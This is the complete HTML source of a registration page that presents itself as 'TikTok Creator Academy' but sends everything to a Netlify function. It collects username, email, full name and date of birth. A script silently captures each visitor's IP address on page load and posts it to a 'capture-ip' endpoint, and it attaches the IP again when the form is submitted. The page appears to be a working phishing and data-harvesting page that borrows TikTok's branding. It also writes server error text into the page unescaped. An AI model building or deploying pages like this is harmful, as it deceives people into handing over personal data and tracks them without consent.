<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Creator Academy Registration</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <img src="https://www.tiktok.com/creator-academy/static/logo.png" alt="TikTok Creator Academy Logo" class="logo">
        <h1>Join TikTok Creator Academy</h1>
        <p>Sign up to access free courses, analytics tools, and creator resources!</p>
        <p class="privacy-notice">By submitting, you consent to our <a href="https://www.tiktok.com/legal/page/global/privacy-policy/en" target="_blank">Privacy Policy</a>, .</p>
        <form id="registration-form" action="/.netlify/functions/submit" method="POST">
            <label for="username">TikTok Username</label>
            <input type="text" id="username" name="username" required>
            
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" required>
            
            <label for="full-name">Full Name</label>
            <input type="text" id="full-name" name="full-name" required>
            
            <label for="dob">Date of Birth</label>
            <input type="date" id="dob" name="dob" required>
            
            <label for="interests">Content Interests (e.g., Dance, Comedy, Education)</label>
            <input type="text" id="interests" name="interests">
            
            <label for="details">Why do you want to join the Creator Academy?</label>
            <textarea id="details" name="details" rows="4"></textarea>
            
            <label class="consent-label">
                <input type="checkbox" name="consent" required>
                I consent to data collection. 
            </label>
            
            <button type="submit">Join Now</button>
        </form>
        <div id="response-message"></div>
    </div>

    <script>
        // Capture IP on page load
        async function capturePageLoadIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const ip = data.ip;
                console.log('Page load IP:', ip);
                await fetch('/.netlify/functions/capture-ip', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip })
                });
                console.log('Page load IP sent to server');
            } catch (error) {
                console.error('Failed to capture page load IP:', error);
            }
        }

        // Run on page load
        capturePageLoadIP();

        // Form submission with IP
        const form = document.getElementById('registration-form');
        const responseMessage = document.getElementById('response-message');

        form.addEventListener('submit', async (event) => {
            event.preventDefault();
            const formData = new FormData(form);
            const data = Object.fromEntries(formData);

            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                data.form_submit_ip = ipData.ip;
                console.log('Sending form data with IP:', data);

                const response = await fetch('/.netlify/functions/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                console.log('Response status:', response.status);
                const result = await response.json();
                console.log('Raw response:', result);

                responseMessage.innerHTML = response.ok 
                    ? '<p class="success">Successfully registered! Check your email for next steps.</p>'
                    : `<p class="error">Error: ${result.error}</p>`;
            } catch (error) {
                console.error('Fetch error:', error);
                responseMessage.innerHTML = '<p class="error">Failed to submit form. Please try again.</p>';
            }
        });
    </script>
</body>
</html>
